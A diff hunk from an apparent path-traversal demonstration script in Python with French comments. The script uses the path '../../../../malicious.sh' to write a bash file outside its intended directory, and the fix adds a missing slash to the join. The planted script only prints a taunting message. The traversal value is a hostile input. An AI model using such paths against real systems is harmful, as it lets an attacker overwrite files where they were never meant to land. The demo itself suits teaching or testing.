@@ -11,7 +11,7 @@ vulnerable_path = '../../../../malicious.sh'
 
 # Créer un script Bash malveillant qui écrit un message dans le terminale
 # que vous appelerez malicious.sh
-with open('.evil'+vulnerable_path, 'w') as f:
+with open('.evil/'+vulnerable_path, 'w') as f:
     f.write("#!/bin/bash\n")
     f.write('echo \"Ahahah je t\'ai bien eu !\"')
 
